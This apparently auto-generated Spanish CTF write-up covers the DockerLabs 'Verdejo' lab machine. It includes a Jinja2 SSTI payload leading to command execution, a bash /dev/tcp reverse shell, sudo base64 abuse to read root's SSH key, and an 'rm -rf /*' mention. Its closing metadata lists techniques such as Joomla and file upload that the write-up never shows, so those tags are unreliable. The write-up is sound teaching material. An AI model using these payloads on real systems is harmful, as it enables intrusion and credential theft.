---
title: Verdejo
node_type: machine
platform: dockerlabs
difficulty: facil
os: linux
source_path: Maquinas De Dockerlabs/Maquinas Faciles/Verdejo.md
needs_review: false
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# Verdejo

## Resumen

Verdejo concentra varias tecnicas en una sola ruta: enumeracion web, SSTI, cracking de contrasenas, subida o ejecucion remota y escalada por SUID, util para consultar cadenas mixtas de explotacion.

Fuente original: [Maquinas De Dockerlabs/Maquinas Faciles/Verdejo.md](https://github.com/8andit0/BanditBox/blob/main/Maquinas%20De%20Dockerlabs/Maquinas%20Faciles/Verdejo.md)

## Datos clave

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | facil |
| Sistema operativo | linux |
| Puertos detectados por texto | 22, 80, 8089, 12345 |
| Imagenes en fuente | 37 |
| Palabras en fuente | 2622 |
| Requiere revision | false |

## Resolucion paso a paso

>Hoy vamos con una maquina muy buena que tiene un poco de todo, y nos ayudara a afianzar conceptos sobre SSTI, cracking de contraseñas y unos pocos conceptos de Python, vamos pues :3

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513163817.png)

>Primero, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513163908.png)

>Hacemos un Ping a la maquina victima, para verificar la conexión con trazas ICMP:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513164036.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Haremos un escaneo fuerte con Nmap para identificar puertos abiertos y sus servicios:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513164213.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sVC (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Vemos el puerto 22 con una versión medio actualizada de OpenSSH, el puerto 80 con un servidor web Apache en una versión actual, y el puerto 8089 en donde también corre un servicio web con Werkzeug. Esto es curioso, lo analizamos con whatweb:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513165332.png)
_Whatweb es una herramienta de reconocimiento web creada en Ruby, esta hecha para identificar tecnologías web (Es capaz de detectar Frameworks, plugins, CMS, etc).
Por lo general, mediante una petición GET, recolecta información de toda la respuesta (Cookies, código HTML, encabezados), para que luego, el motor de whatweb con REGEX (expresiones regulares) y sus propios plugins (scripts) de Ruby analicen la respuesta en búsqueda de particularidades propias de tecnologías (Como wp-content para WordPress, X-Powered-By para php o /templates/Joomla para Joomla).
Al encontrar coincidencias. usa sus propios plugins (scripts) de Ruby para identificar las tecnologías:
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250506154219.png)_
_En este caso, usamos la flag -t para dar 200 hilos al escaneo y la flag -a 4 para indicar la mayor agresividad sobre la web (No hay problema ya que es un entorno controlado)_

>Podemos ver que corre la versión 3.11.2 de Python, y la  2.2.2 de Werkzeug. Este mismo es un kit de bibliotecas de Python para la creación de webs rápidamente.
>Vamos a explorar la web:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513165611.png)

>Vemos un panel donde se pueden introducir valores...

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513165712.png)

>Al enviar un valor la pagina simplemente lo refleja en la respuesta.
>Lo primero que podemos hacer en este punto es intentar insertar comandos JavaScript para probar XSS:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513165934.png)
_Se inserta un script sencillo en JavaScript que genera una alerta_

>La web es vulnerable a inyecciones XSS, esto pasa porque la no se sanitiza bien el input (lo que se inserta en un panel) de usuario. Tristemente, en esta web no nos sirve de mucho, ya que el Cross Side Scripting ocurre cuando el servidor devuelve tal cual lo insertado por el usuario para ser ejecutado del lado del cliente, como en este caso no hay mas usuarios que accedan a esta pagina, y el valor insertado no se mantiene en la web para ser interpretado por alguien mas, no podemos explotar nada.

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513171331.png)
_A modo de traza, puedes ver en el código fuente como lo que inyectamos es leído por el HTML como código de la web y no como input de usuario_

>Pero, lo anterior nos hace ver que el servidor no sanitiza bien el Input de usuario, así que podemos pensar en un posible SSTI (Server Side Template Injection)
>El SSTI es una vulnerabilidad critica que se da del lado del servidor, consiste en la inyección de código malicioso en plantillas preconstruidas...

>Para entenderlo mejor, se puede definir cómo la inyección de código con una sintaxis especial, que si el servidor no sanitiza bien, termina ejecutando.
>un código muy usual de platillas seria este:

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def hello():
    nombre = request.args.get('nombre', 'Invitado')
    plantilla = f"<h1>Hola, {nombre}!</h1>"  # PARTE VULNERABLE A SSTI
    return render_template_string(plantilla)
```
_Ejemplo de plantillas con Flask de Python_

>El código anterior recolecta el input del usuario y no lo sanitiza. Si un usuario prueba insertar {{9 * 9}} el servidor podría interpretarlo y devolver un 81 (la operación resuelta) en vez de {9 * 9} (El input real del usuario)

>Ahora bien, la sintaxis para probar inyecciones cambia dependiendo de la tecnología de plantillas que este corriendo en el servidor, como nosotros sabemos que la tecnología Werkzeug corre en el servidor con Python, podemos suponer que se usa un motor de plantillas típico para Python como Jinja2. (_De todas maneras por lo general se van probando entre diferentes tipos de inyecciones hasta dar con la correcta_)

>[Aqui](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) Podrás encontrar un muy buen recurso para ir probando inyecciones de plantillas.
>Vamos a probar una ecuación:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250513174222.png)

>¡¡Vemos que es vulnerable!!.
>Por lo general en este punto se empiezan a probar muchos payloads para leer archivos de la maquina, ejecutar comandos en el sistema victima y hasta obtener una Reverse Shell. Todo lo anterior podemos lograrlo husmeando un poco en Hacktricks (_El recurso que te deje arriba_). Pero, para méritos del aprendizaje, vamos a hacerlo manualmente O.O:

>Bien, luego de enumerar tecnologías, pudimos determinar que muy probablemente por detrás utiliza un servicio como "Jinja2" para plantillas.
>En Jinja2 y Python, todo es un objeto, y al crear uno, podemos luego acceder a sus metadatos internos:

```python
' '
```
_Puedes definir como objeto cualquier cosa; un numero, un valor booleano o un str (Texto). Para evitar cualquier error, nosotros como objeto definiremos una cadena vacía_

>Ahora, ya con nuestro objeto, vamos a acceder a su clase:

```Python
' '.__class__
```
_Con esta sintaxis le indicamos a Python que deseamos ver la clase a la que pertenece el objeto (Todos los objetos tiene una clase)_

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515003807.png)

>Como podemos ver, la cadena vacía es de clase str, realmente saber esto no nos sirve de nada, PERO, desde aquí podemos llamar al atributo interno de las clases "_ _ mro _ " que nos muestra el orden en el que Python busca los métodos cuando son llamados:

```python
' '.__class__.__mro__
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515005356.png)

>Lo anterior nos devuelve una tulpa con 2 clases, la que necesitamos es la clase Object que tiene en si un método del que podemos abusar para ejecutar comandos. Vamos a elegir Object

```python
' '.__class__.__mro__[1]
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515005632.png)
_De esta manera elegimos el segundo item, siendo el primero igual a 0 y el segundo igual a 1_

>Desde aquí, vamos a usar "_ _ subclasses _ _ ()" para listar todas las clases que existen en Object (Que es la clase base de todas las clases en Python), incluyendo las peligrosas  ╰(*°▽°*)╯

```python
' '.__class__.__mro__[1].__subclasses__()
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515011000.png)

>Entre esa gran respuesta que acabamos de recibir, debemos encontrar el índice de la clase "Subprocess.Popen" que nos permitirá inyectar comandos, este índice puede ser [48] o [335]

```python
' '.__class__.__mro__[1].__subclasses__()[?]
```


>Aunque tiene algunas veces Índice por defecto, lo mejor que podemos hacer es buscarlo con el intruder de burpsuite:

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515012101.png)
>		_Abrimos burpsuite_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515012235.png)
>		_Nos vamos a la pestaña proxy, abrimos el navegador de Burp y empezamos a interceptar_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515013009.png)
>		_Interceptamos nuestra petición y con Ctrl+i Lo emitimos al intruder_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515013551.png)
>		_Ya en este punto, marcamos el lugar de la petición donde queremos probar combinatorias (Justo en el indice de subclasses "__subclasses__()[?]") y marcamos la casilla "add"

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515014629.png)
>		_En el apartado Payloads, elegimos de tipo numérico, y el rango será de 0 hasta 500 (Pueden ser mas si lo amerita)_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515014244.png)
>		_Y por ultimo en Settings>Grep-match ingresamos con add la cadena que queremos buscar entre todas las respuestas_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515014448.png)
>		_Iniciamos el ataque_
>		_De esta manera estamos probando 500 números para el mismo campo, buscando una respuesta que de Match con la cadena "Subprocess.Popen" que buscamos

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515033025.png)
>		_Finalmente, logramos una coincidencia con el payload 496, allí tenemos nuestra clase Subprocess.Popen_

>	![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515033337.png)


>Ya que tenemos el numero de la clase que buscamos, Vamos a crear un objeto que la clase Popen pueda leer, uno que nos permita ejecutar comandos:

```python
' '.__class__.__mro__[1].__subclasses__()[496]('id', shell=True, stdout=-1)
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515020203.png)
_id será el comando que queremos ejecutar, Shell=True nos permite ejecutar los comandos como en una terminal, y stdout=-1 envía como stdout (respuesta del comando) con subprocess.PIPE para que la salida del comando se pueda ver por pantalla_

>Ya tenemos nuestro Payload, ahora por ultimo, recogemos la salida de todo el proceso con el método communicate() :

```python
' '.__class__.__mro__[1].__subclasses__()[496]('id', shell=True, stdout=-1).communicate()
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515021156.png)

>TENEMOS RCE :3

>Sin perder mas tiempo, vamos a entablarnos una reverse Shell
>Debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 12345 con “nc”:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515022408.png)
1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
3. -l Con este parámetro entramos en un modo de escucha de conexiones
4. -v El modo verbose lo usamos para ver más detalles sobre la escucha e información de la conexión1
5. -p con este parámetro indicamos el puerto que estará en escucha, en este caso el 12345

>Ya estando en escucha, insertamos nuestro payload:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515022602.png)

```bash
bash -c "bash -i >%26 /dev/tcp/172.17.0.2/12345 0>%261")
```
_//El %26 es una codificación en URL de “&” para que no hayan problemas//_
_Vamos a intentar entenderlo al máximo este comando:_
1. _bash -c Ejecuta lo siguiente dentro de las comillas como una subshell, en pocas palabras, ejecuta el comando entre comillas como si fuera un script de bash._
2. _bash -i Lanza una bash en modo interactivo (para tener una shell medianamente funcional)_
3. _>%26 /dev/tcp/172.17.0.1/1234 0>%261 Es una manera PROPIA de bash para abrir una conexión TCP hacia una ip y un puerto, con la primera parte >%26 /dev/tcp/ip/puerto dirigimos el stdout (respuestas de la shell) de la maquina victima a nuestra ip, y con la segunda parte 0>%261 indicamos que el stdin(comandos que insertamos) de nuestra máquina irá a la ip victima para ser interpretado. En pocas palabras, abrimos una comunicación bidireccional entre nuestra ip y la ip victima, redireccionando nuestra entrada estándar (stdin) y la salida estándar de la víctima (stdout)._

>Ya estamos dentro del sistema, vamos a listar privilegios, para ver si nuestro usuario tiene permisos especiales sobre algún binario:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515022835.png)
_Ejecutamos el binario setuid (que siempre se ejecuta como root)“SUDO”, con la flag “-l”. El binario busca los privilegios que el usuario actual tiene descritos en el archivo /etc/sudoers y los muestra por pantalla (Si aplica)_
1. _(root) Permite ejecutar el binario como el mas privilegiado, root_
2. _NOPASSWD Nos indica que no es necesario ingresar contraseña para ejecutar el binario_
3. _/usr/bin/base64 Binario sobre el que tenemos privilegios (cuya ruta está definida arriba en “secure_path”_

>El binario base64 nos permite por lo general codificar y decodificar en algoritmo base64. Pero particularmente esta herramienta también nos permite codificar valores que existen dentro de una variable en Linux, si determinada variable tiene una cadena como "/etc/shadow" o "/root/.ssh/id_rsa" base64 intentara codificar lo que hay dentro de ese archivo en el sistema.
>Si un usuario normal tiene permiso para hacer esto como root, podría leer cualquier archivo de la maquina, o al menos eso dice [GTFObins](https://gtfobins.github.io/gtfobins/base64/) O.O

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515024758.png)

>Vamos a ponerlo en practica :3

>Primero, creamos una variable que tenga como valor una ruta sensible del sistema que queramos leer:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515022852.png)
_Esta ruta contiene la clave privada del usuario root_

>Ahora ejecutamos como usuario privilegiado el binario y le pasamos la variable que creamos, para luego ejecutar una decodificación en la misma linea:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515023038.png)
_Base64 codifica lo que hay en la ruta /root/.ssh/id_rsa con permisos elevados, a esa respuesta codificada le aplicamos un "base64 -d" para desencriptar el archivo y verlo en texto claro ya sin privilegios root.

>Tenemos la clave privada ssh del usuario root. Para poderla usar, la copiamos en un archivo del mismo nombre en nuestro sistema y modificamos sus permisos.

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515023206.png)
_con chmod 600 le estamos dando permisos de lectura y escritura solamente al propietario del archivo, esto se hace para que ssh tome como valida la clave.

>Intentamos ingresar por ssh como root con la clave privada:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515023247.png)

>Tristemente, nos pide una contraseña adicional para poder ingresar :(
>(_Esto nos indica que la clave privada esta encriptada y no la podemos usar sin conocer su passphrase (contraseña)_)
>Para esto, vamos a hacer un poco de cracking de contraseñas...
>Primero, vamos a convertir la clave encriptada a un formato que John The Ripper pueda leer:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515023343.png)
_ssh2john es una herramienta propia del paquete "John The Ripper" que extrae el algoritmo de cifrado, el Salt (Cadena aleatoria que se concatena con la passphrase) y los datos cifrados a un formato que John puede leer (John Hash) _

>Con el hash creado, lo rompemos con John:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515023856.png)
_John, toma toda la información del hash creado por ssh2john, reconoce el algoritmo de cifrado y la cadena aleatoria (Salt) que se le concatena al cifrar la clave original, así, va cifrando posibles contraseñas (que hay en el diccionario rockyou) y comparando los hashes que generan con el real en busca de coincidencia, todo esto unas decenas de veces cada segundo._

>Tenemos nuestra contraseña, solo nos queda ingresar al sistema como root ╰(*°▽°*)╯

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250515033539.png)

O.O   //El comando "rm -rf /*" ejecutado como administrador borra todos los archivos del sistema, es un pequeño guiño al ganar acceso como root a una máquina, NO LO EJECUTES//   O.O


## Cadena de ataque detectada

- **Enumeration**: Apache, Connectivity check, HTTP, Joomla, Metadata analysis, PHP, Port enumeration, SSH, Web enumeration
- **Initial Access**: CMS exploitation, Malicious file upload, Remote Code Execution, SSTI
- **Post Exploitation**: Credential extraction, Hash cracking
- **Privilege Escalation**: Hash cracking to root, SUID abuse, SUID binary abuse


## Tecnicas utilizadas

- [CMS exploitation](../../../techniques/cms-exploitation.md)
- [Connectivity check](../../../techniques/connectivity-check.md)
- [Credential extraction](../../../techniques/credential-extraction.md)
- [Hash cracking](../../../techniques/hash-cracking.md)
- [Malicious file upload](../../../techniques/malicious-file-upload.md)
- [Metadata analysis](../../../techniques/metadata-analysis.md)
- [Port enumeration](../../../techniques/port-enumeration.md)
- [Remote Code Execution](../../../techniques/rce.md)
- [SSTI](../../../techniques/ssti.md)
- [SUID abuse](../../../techniques/suid-abuse.md)
- [Web enumeration](../../../techniques/web-enumeration.md)


## Herramientas utilizadas

- [base64](../../../tools/base64.md)
- [Burp Suite](../../../tools/burp-suite.md)
- [grep](../../../tools/grep.md)
- [GTFOBins](../../../tools/gtfobins.md)
- [John the Ripper](../../../tools/john-the-ripper.md)
- [Netcat](../../../tools/netcat.md)
- [Nmap](../../../tools/nmap.md)
- [Ping](../../../tools/ping.md)
- [Python](../../../tools/python.md)
- [Ruby](../../../tools/ruby.md)
- [ssh](../../../tools/ssh.md)
- [sudo](../../../tools/sudo.md)
- [WhatWeb](../../../tools/whatweb.md)


## Servicios relacionados

- [Apache](../../../services/apache.md)
- [HTTP](../../../services/http.md)
- [Joomla](../../../services/joomla.md)
- [PHP](../../../services/php.md)
- [SSH](../../../services/ssh.md)


## Vulnerabilidades relacionadas

- [Insecure file upload](../../../vulnerabilities/insecure-file-upload.md)
- [Secret in metadata](../../../vulnerabilities/secret-in-metadata.md)
- [SUID misconfiguration](../../../vulnerabilities/suid-misconfiguration.md)
- [Unsanitized user input](../../../vulnerabilities/unsanitized-user-input.md)
- [Weak credentials](../../../vulnerabilities/weak-credentials.md)


## Metodos de escalada

- [Hash cracking to root](../../../privilege_methods/hash-cracking-to-root.md)
- [SUID binary abuse](../../../privilege_methods/suid-binary-abuse.md)
